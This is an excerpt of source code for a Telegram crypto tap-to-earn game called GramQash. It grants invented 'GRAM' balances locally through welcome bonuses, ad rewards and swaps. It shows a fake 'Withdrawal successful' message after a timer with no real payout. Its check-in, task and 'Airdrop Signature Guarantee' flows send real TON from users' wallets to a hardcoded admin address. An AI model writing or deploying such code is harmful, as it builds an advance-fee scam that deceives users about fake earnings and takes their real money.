...
export default function App() {
  ...
  const [activeGame, setActiveGame] = useState<
    "drop-blast" | "crypto-runner" | "card-match" | null
  >(null);
...
// Removed loading page
  ...
  useEffect(() => {
    try {
      ...
      if (initData?.start_param && initData.start_param.startsWith("ref_")) {
        const referrerId = initData.start_param.replace("ref_", "");
        if (referrerId !== user.username.toLowerCase().replace(/\s+/g, "_")) {
          // Add a minor simulated bonus or welcome toast
          setTimeout(() => {
            triggerToast(`Invited by active user! +10 GQH Bonus applied.`, "success");
            setUser((prev) => ({
              ...prev,
          ...
          setUser((prev) => {
            ...
            if (isFirstTime) {
              setTimeout(() => {
                addLog(
                  "bonus",
                  "Onboarding Wallet Bonus",
                  "+0.500",
                  "GRAM (ton)",
                );
                triggerToast(
                  "Real GRAM wallet connected successfully! You received +0.5 GRAM (ton)",
                  "success",
                );
              }, 200);
            }
  ...
  const claimWelcomeBonus = () => {
    setUser((prev) => ({
      ...prev,
      tonBalance: prev.tonBalance + 0.5,
      hasClaimedWelcomeBonus: true,
    }));
    addLog("bonus", "Onboarding Welcome Reward", "+0.5", "GRAM (ton)");
    setShowWelcomeModal(false);
    triggerToast("Claimed 0.5 GRAM Welcome Bonus!", "success");
  };
  ...
  const ensureWalletAndPay = async (paymentAction: () => Promise<void>) => {
    if (!tonConnectUIRef.current) {
      triggerToast("GRAM system initializing...", "info");
      return;
    }
    ...
    // Not connected - wait for it
    if (tonConnectUIRef.current) {
      tonConnectUIRef.current.openModal();
      triggerToast("Please connect your wallet to authorize payment.", "info");

      const unsubscribe = tonConnectUIRef.current.onStatusChange(async (wallet) => {
        if (wallet) {
          unsubscribe();
          // Adding a tiny delay to allow modal out-animation to finish before starting tx
          setTimeout(async () => {
             await paymentAction();
          }, 300);
        }
  ...
  const handleConfirmDailyCheckin = async () => {
    ...
    await ensureWalletAndPay(async () => {
      ...
      try {
        ...
        setShowProcessingModal(false);
        if (
          error?.message?.includes("User rejects") ||
  ...
  const handlePayCustomTask = async (tonAmount: string) => {
    return ensureWalletAndPay(async () => {
      ...
      addLog(
        "task",
        "Purchased custom task traffic clicks",
        `-${tonAmount}`,
        "GRAM (ton)",
      );
    });
      ...
      try {
        const transaction = {
          ...
          messages: [
            {
              address: "UQCTZAMbXoN5T43K9gJXH8GYWBmIstXrUrdoV9kv3btN1Ad3", // Admin receiver
              amount: "500000000", // 0.5 TON in nano-TON
            },
          ],
        };
        ...
        setUser((prev) => ({
          ...prev,
          airdropSignatureStatus: "under_review",
        }));

        addLog(
          "task",
          "Airdrop Signature Guarantee Paid",
          "-0.500",
          "GRAM (ton)",
        );

        setShowProcessingModal(false);
        triggerToast("Airdrop Signature submitted successfully!", "success");
      } catch (error: any) {
        setShowProcessingModal(false);
        if (
          error?.message?.includes("User rejects") ||
  ...
  const handleClaimAdReward = () => {
    ...
    setUser((prev) => ({
      ...prev,
      gqhBalance: prev.gqhBalance + 40,
      watchedAdsCount: (prev.watchedAdsCount || 0) + 1,
      completedTasksCount: (prev.completedTasksCount || 0) + 1,
    }));
    setAdCooldown(30); // 30 seconds cooldown
    addLog("task", "Watched Promotional Ad", "+40.0", "GQH");
    triggerToast("Earned +40 GQH from Watching Ad!", "success");
  };
  ...
  const handleSwapTokens = (gqhPaid: number, tonGained: number) => {
    ...
    addLog(
      "swap",
      "Swapped GQH to GRAM liquidity",
      `-${gqhPaid.toFixed(1)}`,
      "GQH",
    );
    addLog(
      "swap",
      "GRAM (ton) Liquidity Credited",
      `+${tonGained.toFixed(4)}`,
      "GRAM (ton)",
    );

    triggerToast(
      `Converted ${gqhPaid.toFixed(0)} GQH to ${tonGained.toFixed(4)} GRAM (ton)`,
      "success",
    );
  };
  ...
  const handleLaunchGame = (
    gameId: "drop-blast" | "crypto-runner" | "card-match",
  ) => {
  ...
  const handleConfirmWithdrawal = () => {
    ...
    setTimeout(() => {
      ...
      addLog(
        "withdraw",
        "GRAM (ton) payout settlement request",
        `-${amountWithdrawn.toFixed(3)}`,
        "GRAM (ton)",
      );
      setShowProcessingModal(false);
      triggerToast(
        "Withdrawal successful! Processing to blockchain.",
        "success",
      );
    }, 2000);
  };
      ...
      <div className="w-screen h-[100dvh] bg-black text-white font-sans overflow-hidden relative select-none flex flex-col mx-auto w-full md:max-w-md md:border-x border-slate-800">
          ...
          <header className="border-b border-slate-900/50 bg-slate-950/40 backdrop-blur-xl px-4 py-3 flex items-center justify-between shrink-0 select-none z-10 transition-colors">
            <div className="flex items-center gap-2">
              ...
              <div>
                <h1 className="text-sm font-extrabold tracking-tight text-white flex items-baseline gap-1.5 leading-none">
                  GramQash
                </h1>
                <div
                  className="flex items-center gap-1 mt-0.5"
                  title="Live Players Online"
                >
                  <span className="relative flex h-1.5 w-1.5 shrink-0">
                    <span className="animate-ping absolute inline-flex h-full w-full rounded-full bg-emerald-400 opacity-75"></span>
                    <span className="relative inline-flex rounded-full h-1.5 w-1.5 bg-emerald-500"></span>
                  </span>
                  <span className="text-[10px] font-bold text-slate-400 tabular-nums tracking-tight">
                ...
                >
                  <div className="space-y-1">
                    ...
                    <p className="text-xs text-slate-400">
                      Gas fee and claim request allocation.
                    </p>
                  </div>
                  ...
                  <div className="bg-slate-950/50 p-6 rounded-2xl border border-slate-800/80 flex flex-col items-center justify-center space-y-2">
                    ...
                    <span className="text-xs text-indigo-400 font-semibold bg-indigo-500/10 px-2.5 py-0.5 rounded-full">
                      +30.0 GQH reward
                    </span>
                  </div>
                  ...
                  <div className="text-[10px] text-slate-500 space-y-1">
                    <p>
                      ...
                      <span className="font-mono text-slate-400">
                        GramQash Allocator System
                      </span>
                    </p>
                    <p>
                      Status:{" "}
                      <span className="text-green-500 font-bold active">
                        Available
                      </span>
                    </p>
                  </div>
                ...
                >
                  ...
                  <div>
                    <p className="font-bold text-slate-200">
                      Writing Smart Contract Transaction Details...
                    </p>
                    <p className="text-xs text-slate-500 mt-1">
                      Contacting GRAM RPC servers...
                    </p>
                  </div>
                </motion.div>
              </div>
              ...
              <div className="fixed inset-0 z-50 flex items-center justify-center p-4">
                ...
                >
                  <div className="text-center space-y-2">
                    ...
                    <p className="text-xs text-slate-400">
                      You need a minor amount of GRAM (at least 0.07 GRAM (ton))
                      to settle check-in fees on-chain.
                    </p>
                  </div>
                  ...
                  <div className="bg-slate-950 p-4 rounded-2xl space-y-3.5 text-xs">
                    ...
                    <ul className="list-disc list-inside space-y-1.5 text-slate-400">
                      <li>
                        Convert GQHs into GRAM inside the home tab swapper!
                      </li>
                      <li>
                        Connect a fresh GRAM wallet to get our{" "}
              ...
              <div className="fixed inset-0 z-50 flex items-center justify-center p-4">
                ...
                >
                  <div className="space-y-1.5">
                    ...
                    <p className="text-xs text-slate-400">
                      You are settling your accumulated Gramcoin to your
                      personal custody wallet address.
                    </p>
                  </div>
                  ...
                  <div className="bg-slate-950/60 p-5 rounded-2xl border border-slate-800 space-y-2 flex flex-col items-center justify-center">
                    ...
                    <span className="text-[10px] text-slate-500 font-bold uppercase tracking-wider">
                      Settling Value (Estimated)
                    </span>
                    <p className="text-3xl font-black text-green-500">
                      {(user.tonBalance - 0.005).toFixed(3)} GRAM
                    </p>
                    <p className="text-xs text-slate-500">
                      ~${((user.tonBalance - 0.005) * tonPrice).toFixed(2)} USD
                    </p>
                  </div>
                ...
                >
                    ...
                    >
                      ...
                      <div className="space-y-1.5">
                        <h3 className="text-xl font-black text-white tracking-tight">
                          1. Active Coin Mining
                        </h3>
                        <p className="text-xs text-slate-400 leading-relaxed px-2">
                          Tap the giant 3D gold token inside the **Mine GQH
                          Coins** page to farm raw assets! Your energy
                  ...
                  {onboardingSlide === 1 && (
                    ...
                    >
                      ...
                      <div className="space-y-1.5">
                        <h3 className="text-xl font-black text-white tracking-tight">
                          2. Grow Leagues Tiers
                        </h3>
                        <p className="text-xs text-slate-400 leading-relaxed px-2">
                          Build your balance to bypass locks and advance through
                          **Bronze, Silver, Gold, Platinum, and Diamond**
                          Leagues. Higher tiers unlock stronger tap powers!
                        </p>
                      </div>
                    </motion.div>
                  )}
                  ...
                  {onboardingSlide === 2 && (
                    ...
                    >
                      ...
                      <div className="space-y-1.5">
                        <h3 className="text-xl font-black text-white tracking-tight">
                          3. Convert GQH to GRAM
                        </h3>
                        <p className="text-xs text-slate-400 leading-relaxed px-2">
                          Swap your mined GQH assets into safe Gramcoin (GRAM
                          (ton)) directly at standard rates inside the secure
                          converter. Grab instant wallet custody payouts!
                        </p>
                      </div>
                    </motion.div>
                  )}
                  ...
                  {onboardingSlide === 3 && (
                    <motion.div
                      ...
                      className="space-y-4"
                    >
                      <div className="w-14 h-14 bg-gradient-to-tr from-cyan-400 to-blue-500 rounded-2xl flex items-center justify-center mx-auto shadow-md">
                        <img
                      ...
                      <div className="space-y-1">
                        <h3 className="text-xl font-black text-white tracking-tight">
                          Welcome Gift Waiting!
                        </h3>
                        <p className="text-xs text-slate-450 leading-relaxed">
                          Thank you for starting. Collect our premium starter
                          allowance balance instantly.
                        </p>
                      </div>
                      ...
                      <div className="bg-gradient-to-br from-blue-950/20 via-slate-950/40 to-indigo-950/25 p-4 rounded-2xl border border-slate-800 shadow-inner">
                        <span className="text-[9px] text-slate-500 font-extrabold uppercase tracking-widest">
                          Onboarding Balance Premium
                        </span>
                        <p className="text-3xl font-black text-blue-400 mt-1 tracking-tight flex justify-center items-center gap-2">
                          +0.5{" "}
                          <span className="text-xl text-blue-300">GRAM</span>
                        </p>
                      </div>
                    </motion.div>
                  )}
            ...
            {activeAdSim && (
              ...
              >
                ...
                <div className="flex justify-between items-center z-10">
                  <span className="text-xs text-slate-500 font-mono font-bold tracking-brand">
                    Educational Promo
                  </span>
                ...
                <div className="flex-1 flex flex-col items-center justify-center space-y-6 text-center max-w-md mx-auto relative px-4">
                  ...
                  <div className="space-y-4">
                    ...
                    <div className="space-y-2">
                      ...
                      <p className="text-sm text-slate-400 max-w-xs leading-relaxed">
                        Designed and built directly in Google AI Studio.
                        Empowering agents to write polished, rapid, full-scale
                        layouts instantly!
                      </p>
                    </div>
                  </div>
                  ...
                  <div className="text-xs text-slate-500">
                    Support partners! Keep the community active and free with
                    ads. We share royalties back to you.
                  </div>
                </div>
